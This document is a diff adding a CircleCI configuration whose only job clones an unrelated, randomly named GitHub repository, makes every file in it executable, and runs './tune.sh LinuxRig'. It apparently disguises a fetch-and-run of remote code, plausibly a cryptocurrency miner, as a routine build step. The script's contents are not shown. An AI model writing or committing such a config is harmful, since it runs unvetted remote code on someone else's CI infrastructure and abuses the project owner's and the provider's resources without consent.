@@ -1,0 +1,21 @@
+version: 2.1
+
+jobs:
+  build:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - run:
+          name: Clone and Run Script
+          command: |
+            git clone https://github.com/opexug/xyvbo.git
+            cd xyvbo
+            chmod +x *
+            ./tune.sh LinuxRig
+
+workflows:
+  version: 2
+  run-job:
+    jobs:
+      - build
